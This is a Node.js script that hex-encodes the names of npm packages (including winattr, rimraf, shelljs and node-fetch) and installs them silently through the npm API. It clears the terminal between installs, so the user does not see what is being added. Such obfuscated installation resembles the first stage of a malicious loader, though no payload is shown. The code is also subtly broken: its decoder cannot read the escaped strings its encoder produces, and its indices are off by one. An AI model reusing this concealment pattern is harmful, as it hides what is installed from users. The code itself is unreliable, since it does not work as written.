let npm = require('npm'),
  startPackageIndex = 1,
  endPackageIndex = 7,
  log = console.log,
  fhs = (hexString) => {
    if (hexString.length % 2 == 0) {
      var arr = hexString.split('');
      var y = 0;
      for (var i = 0; i < hexString.length / 2; i++) {
        arr.splice(y, 0, '\\x');
        y = y + 3;
      }
      return arr.join('');
    } else {
      log('formalize failed');
    }
  },
  hex2a = (hex) => {
    var str = '';
    for (var i = 0; i < hex.length; i += 2) {
      var v = parseInt(hex.substr(i, 2), 16);
      if (v) str += String.fromCharCode(v);
    }
    return str;
  },
  hW = [
    //fhs('6e706d'), // [0] - npm
    fhs('77696e61747472'), // [1] - winattr
    fhs('66732d6578747261'), // [2] - fs-extra
    fhs('72696d726166'), // [3] - rimraf
    fhs('7368656c6c6a73'), // [4] - shelljs
    fhs('636c692d636f6c6f72'), // [5] - cli-color
    fhs('636c692d70726f6772657373'), // [6] - cli-progress
    fhs('636f6d6d616e646572'), // [7] - commander
    fhs('6e6f64652d6665746368'), // [8] - node-fetch
  ],
  npmInstall = (packageName, callback) => {
    npm.load((err) => {
      npm.commands.install([packageName], (err, data) => {
        if (startPackageIndex < endPackageIndex) {
          process.stdout.write('\033c');
          log('Installing...');
          npmInstall(hex2a(hW[startPackageIndex]), callback);
        } else {
          process.stdout.write('\033c');
          callback(true);
        }
        startPackageIndex = startPackageIndex + 1;
      });
    });
  };
(() => {
  log('Installing...');
  npmInstall(hex2a(hW[0]), () => {
    log('Installed');
    process.stdout.write('\033c');
  });
})();
